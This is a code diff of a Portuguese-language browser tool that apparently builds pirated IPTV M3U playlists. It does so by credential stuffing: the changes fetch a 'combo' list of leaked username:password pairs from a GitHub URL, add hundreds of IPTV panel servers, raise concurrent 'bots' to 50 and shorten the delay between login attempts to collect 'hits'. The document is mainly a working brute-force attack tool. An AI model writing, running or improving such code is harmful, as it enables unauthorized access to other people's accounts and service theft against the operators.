@@ -323,8 +323,8 @@
         
         <div class="config-panel">
             <div class="form-group">
-                <label for="threadCount">Bots concorrentes (1-20)</label>
-                <input type="number" id="threadCount" min="1" max="20" value="5">
+                <label for="threadCount">Bots concorrentes (1-50)</label>
+                <input type="number" id="threadCount" min="1" max="50" value="10">
             </div>
             
             <button id="generateBtn" class="btn btn-primary">Gerar M3U</button>
@@ -386,21 +386,27 @@
         let totalHits = 0;
         let totalErrors = 0;
         let startTime = 0;
+        let combos = [];
         let results = [];
         
-        // Lista de servidores para teste (mais diversificada)
+        // Lista completa de servidores originais
         const servers = [
-            "http://cdn.jccob.click",
-            "http://dns.carnes.ink:80",
-            "http://dns.cebola.pro:80",
             "http://belize-transport33.sbs:80",
             "http://bpbe.one:80",
+            "http://brone.fyi",
+            "http://c4n.fun",
             "http://cinefull.space:80",
             "http://cinepulse.live",
+            "http://dns.carnes.ink:80",
+            "http://dns.cebola.pro:80",
+            "http://dns.falcon90.store:80",
             "http://firetop1.site",
+            "http://fthzx.online:80",
             "http://kstv.us:8080",
             "http://limed.cc",
+            "http://minhatv.eu",
             "http://newbox.space:80",
+            "http://nitrohd.xyz",
             "http://nitrohd.xyz:80",
             "http://pfsv.io:80",
             "http://pgzva.my",
@@ -409,21 +415,310 @@
             "http://vtrev.cc",
             "http://xci.nz:80",
             "http://brothersplay.com:80",
-            "http://cdn.apkwuv.xyz:80"
+            "http://cdn.apkwuv.xyz:80",
+            "http://dark.topk.live:80",
+            "http://dns.gpsrv.shop:80",
+            "http://hsgbola1.xyz",
+            "http://mamaodoce.online",
+            "http://saltbrth.xyz",
+            "http://touroboxv4.redemais.click:80",
+            "http://vela2b.sbs:80",
+            "http://vip.tvhome.click:80",
+            "http://x.mx51.online:80",
+            "http://pbkblack.site",
+            "http://cdn11.cc:80",
+            "http://dfkkh.dtwkaf.xyz:80",
+            "http://fiufiu.live:80",
+            "http://hdtvs.top:80",
+            "http://holtcomfast.icu",
+            "http://oneplay.cc",
+            "http://v4.agenciav4.top",
+            "http://vyvofibra.us",
+            "http://b1.svb32fg.icu",
+            "http://axr7.one:80",
+            "http://bananadoce.online:80",
+            "http://booklife.space:8080",
+            "http://lb01.site",
+            "http://gomn.xplus2.xyz:2095",
+            "http://hsgbola1.xyz:80",
+            "http://natkcz.xyz:80",
+            "http://209.14.88.42:80",
+            "http://oldmonkey.fun:80",
+            "http://a.mx51.online:80",
+            "http://buzbond.bond:80",
+            "http://familyplayy.top:80",
+            "http://levitashow.click:80",
+            "http://sw2z.in:80",
+            "http://jamboso.com",
+            "http://opaioo.com",
+            "http://gangaplayer.com:80",
+            "http://mixmil.cyou:80",
+            "http://sonicstream.shop:80",
+            "http://1296x.srvsh.xyz",
+            "http://12ww11.top",
+            "http://138.199.41.6:80",
+            "http://14225021914.com:80",
+            "http://149.18.18.90:80",
+            "http://15aera.xyz",
+            "http://15aera.xyz:80",
+            "http://178.162.193.239:2052",
+            "http://178.162.193.239:8080",
+            "http://178.162.197.167:2052",
+            "http://178.162.197.175",
+            "http://178.162.197.175:80",
+            "http://178.162.197.175:8080",
+            "http://178.162.197.184:2052",
+            "http://178.162.212.141:2052",
+            "http://178.162.212.150:2052",
+            "http://179.60.53.20:55577",
+            "http://185.194.204.156:80",
+            "http://1play.cool:8000",
+            "http://2.magmas5.com:8000",
+            "http://2.villevalo.pro",
+            "http://244a.cc:80",
+            "http://4.iptv11.is:80",
+            "http://4f.rs:80",
+            "http://4tv.site",
+            "http://4tv.site:80",
+            "http://5ce.co:80",
+            "http://5ce.me",
+            "http://5ce.me:80",
+            "http://5central.me",
+            "http://5central.me:80",
+            "http://5estrelas.top:80",
+            "http://5network.cyou",
+            "http://5network.cyou:80",
+            "http://5stak.xyz:80",
+            "http://6digital9.chocoplus.xyz:8080",
+            "http://7779rt.top",
+            "http://7779rt.top:80",
+            "http://7cdnmax.xyz:8080",
+            "http://7forever.xyz:80",
+            "http://7forever.xyz:8080",
+            "http://7max.top",
+            "http://7max.top:80",
+            "http://7max.top:8080",
+            "http://7online.xyz",
+            "http://7online.xyz:80",
+            "http://7rota1app.link",
+            "http://Cdnbrux.top",
+            "http://EXM3U.77xxs.xyz",
+            "http://Vis.blue:80",
+            "http://a.srvhib.com.br",
+            "http://ad44.shop:8080",
+            "http://amorvenceu.top:80",
+            "http://analov.lat",
+            "http://app.tecnomolly.com:8080",
+            "http://arrepiado.xyz",
+            "http://atlas06.xyz:80",
+            "http://bevolahouse.uk:8080",
+            "http://bgouv13.com:80",
+            "http://bincp.xyz",
+            "http://binwtorre.online:80",
+            "http://blogtiger.win:8080",
+            "http://bogotaresort.vip:8080",
+            "http://cairogroup.uk:8080",
+            "http://canal.cdntv.com.br:80",
+            "http://canexcorso.net:8080",
+            "http://cdn.xuiinstall.fun:80",
+            "http://cdn4k.info",
+            "http://cdn4k.us",
+            "http://cdn4k.vip:80",
+            "http://cdn7ever.xyz:80",
+            "http://cdn7light.xyz:80",
+            "http://cdn88.xyz",
+            "http://cinepulse.xyz:80",
+            "http://cldnew.com",
+            "http://cm1.portaltv.info:777",
+            "http://costela.top",
+            "http://cuvillier.gentv.to:8080",
+            "http://d.rodeo:80",
+            "http://dns.aipim.info:80",
+            "http://dns.aipim.info:8080",
+            "http://dns.ulttv.xyz",
+            "http://dnsbr.cloud",
+            "http://dnsbr.xyz",
+            "http://dnsrp.abre.xyz:80",
+            "http://dnssp.site",
+            "http://dsmar.mov:80",
+            "http://ecliente.xyz",
+            "http://fastream.xyz:8080",
+            "http://fastrunner.live:8080",
+            "http://fhdgdhg25.lat",
+            "http://gameplay.p2sweb.me",
+            "http://geniuscore.uk:8080",
+            "http://globe4.midomed.com:8883",
+            "http://golduhdtv.net",
+            "http://goodcine.my",
+            "http://gopro7.xyz",
+            "http://gopro7.xyz:8080",
+            "http://grtsv1.life",
+            "http://inter.natv.fm",
+            "http://invictosplay.xyz",
+            "http://kaantv.site:8000",
+            "http://kotkoyo.mine.nu:48028",
+            "http://kstv.us:80",
+            "http://ktm42.xyz:2052",
+            "http://letmein.fun:8080",
+            "http://llllllllliosdaiiii1iiiiiiiii.funtogether.xyz:8080",
+            "http://m1-max.dns-speedy.com",
+            "http://m3umais.ovh:8080",
+            "http://miotvtop.hdwcam.com:8080",
+            "http://motoplatxrd.com:80",
+            "http://natsdns.com:8080",
+            "http://newmundo.top:8880",
+            "http://nhflix.xyz",
+            "http://novo1.xyz:80",
+            "http://ottvision.xyz:8080",
+            "http://p1.proiptv.co:88",
+            "http://pegcv.xyz:8880",
+            "http://pfsrv.com:80",
+            "http://picapaunet.top",
+            "http://piratuga.xyz",
+            "http://play.biturl.vip",
+            "http://premiumtop.top:8080",
+            "http://proxy.cdn4k.vip",
+            "http://proxy.cdn4k.vip:80",
+            "http://pvsrvs.xyz:80",
+            "http://qacvz.my:80",
+            "http://radionivus.shop:80",
+            "http://ratomickey.eu",
+            "http://ratomickey.eu:8080",
+            "http://russofv.cc",
+            "http://serv1.xyz",
+            "http://server.iptvxxx.net",
+            "http://smdz.site",
+            "http://smt.appxc.top:80",
+            "http://snopy.mochaiptv.xyz:8000",
+            "http://sp.kiwi:80",
+            "http://srv.hostinggon.xyz:2095",
+            "http://srv.hostinggon12.xyz",
+            "http://srv.hostinggon15.xyz",
+            "http://srv.hostinggon39.xyz",
+            "http://srv.polkafood.pl:80",
+            "http://srvdp.me",
+            "http://srvtop.cloud:80",
+            "http://starplaybr.online:80",
+            "http://supersonictv.live:8080",
+            "http://techplay.click",
+            "http://techplay.click:80",
+            "http://telecine.asia",
+            "http://terenet.net:80",
+            "http://topserver.fun:80",
+            "http://tv.com.vc",
+            "http://tv.dimaiptv.com:8080",
+            "http://tv1.my:80",
+            "http://tv5.me",
+            "http://tv5.me:80",
+            "http://tvlg.appxc.top",
+            "http://ust.lat",
+            "http://veloz.dnstv.uk:80",
+            "http://vip.dom1tv.com",
+            "http://vivaoavida.xyz",
+            "http://wolftkxz.xyz:80",
+            "http://world-qualite.xyz:8080",
+            "http://xp2.wtf",
+            "http://cdn22.cc:80",
+            "http://rtdkh.xyz:80",
+            "http://cms-central.co",
+            "http://gurutuga.pw:8080",
+            "http://bcltop.online",
+            "http://dns.3558510632.click:80",
+            "http://dns.gerenciadorr8.top",
+            "http://livraria.fun:80",
+            "http://opdestiny.top:80",
+            "http://pfsv.io",
+            "http://sualista.xyz",
+            "http://tucxs.click",
+            "http://v4.agenciav4.top:80",
+            "http://veloz.tvbrlive.com",
+            "http://voxp2p.live",
+            "http://xuione.icu:80",
+            "http://agrtv.click:80",
+            "http://cgpdok.xyz:80",
+            "http://amplay.lat:80",
+            "http://maisonxp.click:8080",
+            "http://mistertech.click:80",
+            "http://tvsbt.top:80",
+            "http://vdeos.pics:80",
+            "http://horizon25.shop",
+            "http://cdn.jccob.click",
+            "http://cdn.proxybrasilctvp2.com.br",
+            "http://cdn018.io",
+            "http://cdn11.cc",
+            "http://cdn22.cc",
+            "http://cdn33.cc",
+            "http://cdn45.cc",
+            "http://cdn46.cc",
+            "http://cdn49.cc",
+            "http://cdwmed.xyz",
+            "http://cinefull.space",
+            "http://cliente33.com",
+            "http://cnaxtrax.com",
+            "http://coco-cdn2.cc",
+            "http://dnscine.top:80",
+            "http://jamboso.com:80",
+            "http://sskkdk.srv1ydfg.icu:80",
+            "http://bananadoce.online",
+            "http://felas87dz.icu",
+            "http://steamtv.site",
+            "http://supg.nl",
+            "http://telefone.site:80",
+            "http://turbo.gftv.in:80",
+            "http://viphlvp.xyz:8080",
+            "http://virtusz.zapto.org:80",
+            "http://vmw12.com:80",
+            "http://x2caverinhas.store",
+            "http://xcloudcine.xyz:80",
+            "http://z3.bgts37bc.icu",
+            "http://b1.svb32fg.icu:80",
+            "http://btpx.store:80",
+            "http://bullbr.xyz:80",
+            "http://carabina.pro:80",
+            "http://cdn.jccob.click:80",
+            "http://cdnrptv.com:80",
+            "http://cgpdok.xyz",
+            "http://cinepulse.live:80",
+            "http://ctbnotas.xyz",
+            "http://dns.masteron.fun:80",
+            "http://dns.play-tv.live:80",
+            "http://eckgo.xyz",
+            "http://firetop1.site:80",
+            "http://globalsuper.site:80",
+            "http://gw38.site",
+            "http://hmiguel5.org:80",
+            "http://huloftibu.lol",
+            "http://jctv.drivecar.click:80",
+            "http://jrplay.online:80",
+            "http://lb01.site:80",
+            "http://mw3.tvzinha.org:8080",
+            "http://nandovip.xyz",
+            "http://newoneblack.site",
+            "http://newoneblack.site:80",
+            "http://norrfqf.top:8080",
+            "http://oax.life",
+            "http://rgdtuner.xyz",
+            "http://s.abapx.in:80",
+            "http://sandertvcl.com:8080",
+            "http://semprea100.org:8080",
+            "http://sep22x.in:80",
+            "http://smartvtcl.site:8080",
+            "http://smt.appxc.top",
+            "http://srvplay.live:80",
+            "http://ad3xiy.xyz:80",
+            "http://cbvc.xyz:80",
+            "http://dns.acaidopara.net:80",
+            "http://horizon25.shop:80",
+            "http://alpacinoo.com",
+            "http://carabina.pro",
+            "http://halamix.in:80",
+            "http://omelhor.sucodefruta.xyz",
+            "http://rnplay07.vip",
+            "http://v220xpco.com:80",
+            "http://c.maintech.top",
+            "http://cdn.ax66.shop",
+            "http://gestor.mom"
         ];
-        
-        // Função para gerar combos aleatórios
-        function generateRandomCombos(count) {
-            const combos = [];
-            for (let i = 0; i < count; i++) {
-                // Gera combos aleatórios para garantir resultados diferentes
-                const randomNum = Math.floor(Math.random() * 1000000) + 100000;
-                const username = `user${randomNum}`;
-                const password = `pass${Math.floor(Math.random() * 1000000)}`;
-                combos.push(`${username}:${password}`);
-            }
-            return combos;
-        }
         
         // Função para mostrar notificação
         function showNotification(message, duration = 3000) {
@@ -447,9 +742,33 @@
                 stats.reqPerSec.textContent = `Req/s: ${reqPerSec}`;
             }
             
-            const progress = Math.min(100, (totalHits / 10) * 100);
+            const progress = totalHits >= 10 ? 100 : (totalHits / 10) * 100;
             progressBar.style.width = `${progress}%`;
             progressText.textContent = `${progress.toFixed(1)}%`;
+        }
+        
+        // Função para carregar combos online
+        async function loadCombosOnline() {
+            try {
+                // URL do GitHub com combos
+                const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
+                if (!response.ok) {
+                    throw new Error(`Erro ao carregar combos: ${response.status}`);
+                }
+                const text = await response.text();
+                const lines = text.split(/\r?\n/);
+                
+                combos = lines
+                    .map(line => line.trim())
+                    .filter(line => line && line.includes(':') && !line.startsWith('#'));
+                
+                showNotification(`${combos.length} combos carregados online.`);
+                return true;
+            } catch (error) {
+                showNotification(`Erro ao carregar combos: ${error.message}`);
+                console.error('Erro ao carregar combos:', error);
+                return false;
+            }
         }
         
         // Função para testar um combo em um servidor
@@ -547,16 +866,22 @@
             stopBtn.disabled = false;
             copyAllBtn.disabled = true;
             
-            // Gerar combos aleatórios para garantir resultados únicos
-            const combos = generateRandomCombos(500);
+            // Carregar combos online
+            const loaded = await loadCombosOnline();
+            if (!loaded) {
+                isScanning = false;
+                generateBtn.disabled = false;
+                stopBtn.disabled = true;
+                return;
+            }
             
             // Obter número de threads
-            const threadCount = parseInt(document.getElementById('threadCount').value) || 5;
+            const threadCount = parseInt(document.getElementById('threadCount').value) || 10;
             
             // Iniciar workers
             const workers = [];
             for (let i = 0; i < threadCount; i++) {
-                workers.push(scanWorker(combos));
+                workers.push(scanWorker());
             }
             
             // Aguardar todos os workers terminarem
@@ -575,7 +900,7 @@
         }
         
         // Worker de varredura
-        async function scanWorker(combos) {
+        async function scanWorker() {
             const usedServers = new Set();
             
             while (!stopRequested && combos.length > 0 && totalHits < 10) {
@@ -613,6 +938,7 @@
                         
                         // Parar se atingirmos 10 hits
                         if (totalHits >= 10) {
+                            showNotification("10 hits encontrados! Varredura concluída.");
                             break;
                         }
                     }
@@ -624,7 +950,7 @@
                 updateStats();
                 
                 // Delay entre requisições para não sobrecarregar
-                await new Promise(resolve => setTimeout(resolve, 200));
+                await new Promise(resolve => setTimeout(resolve, 100));
             }
         }
         
